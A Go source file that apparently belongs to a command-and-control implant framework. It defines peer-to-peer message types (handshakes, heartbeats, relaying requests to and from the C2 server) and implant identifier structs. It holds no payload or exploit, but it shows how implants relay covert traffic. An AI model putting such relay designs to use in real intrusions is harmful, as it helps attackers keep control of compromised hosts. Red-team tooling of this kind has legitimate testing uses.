package communication

/**
PEER TO PEER STUFF
*/

const (
	SYN               string = "SYN"
	SYN_ACK           string = "SYN_ACK"
	HEARTBEAT         string = "HEARTBEAT"
	RELAY_POST_TO_C2  string = "RELAY_POST_TO_C2"
	RELAY_GET_TO_C2   string = "RELAY_GET_TO_C2"
	RELAY_GET_FROM_C2 string = "RELAY_GET_FROM_C2"
)

const (
	TASK_SUCCESS int = 0
	TASK_WARNING int = 1
	TASK_ERROR   int = 2
)

type BaseMessageFormat struct {
	MessageType string `json:"type"`
	ImplantGUID string `json:"implant_guid"`
}

type SynMessage struct {
	BaseMessageFormat
	HaveInternetAccess bool `json:"have_internet_access"`
}

type P2P_RELAY_STRUCTURE struct {
	BaseMessageFormat
	ApiPath string
	Data    any
}

type P2P_MESSAGE_FROM_C2 struct {
	BaseMessageFormat
	Data []byte
}

func (message BaseMessageFormat) GetMessageType() (messageType string, ok bool) {
	localMessageType := message.MessageType

	switch localMessageType {
	case SYN:
		return SYN, true
	case SYN_ACK:
		return SYN_ACK, true
	case RELAY_POST_TO_C2:
		return RELAY_POST_TO_C2, true
	case RELAY_GET_TO_C2:
		return RELAY_GET_TO_C2, true
	case RELAY_GET_FROM_C2:
		return RELAY_GET_FROM_C2, true
	default:
		return "", false
	}
}
